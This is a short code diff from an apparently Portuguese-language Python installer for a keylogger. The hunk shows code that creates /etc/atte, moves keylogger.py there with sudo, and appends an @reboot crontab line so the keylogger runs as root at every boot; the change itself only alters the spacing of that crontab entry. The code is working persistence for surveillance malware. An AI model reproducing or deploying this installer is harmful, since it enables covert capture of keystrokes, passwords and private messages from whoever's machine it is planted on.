@@ -11,7 +11,7 @@ def instalar():
     os.mkdir('/etc/atte')
     os.system(f'sudo mv {diretorio_atual}/keylogger.py /etc/atte')
     cron = open('/etc/crontab', 'a')
-    cron.write('@reboot     root    sudo /usr/bin/python3 /etc/atte/keylogger.py')
+    cron.write('@reboot root sudo /usr/bin/python3 /etc/atte/keylogger.py')
     cron.close()
 
 
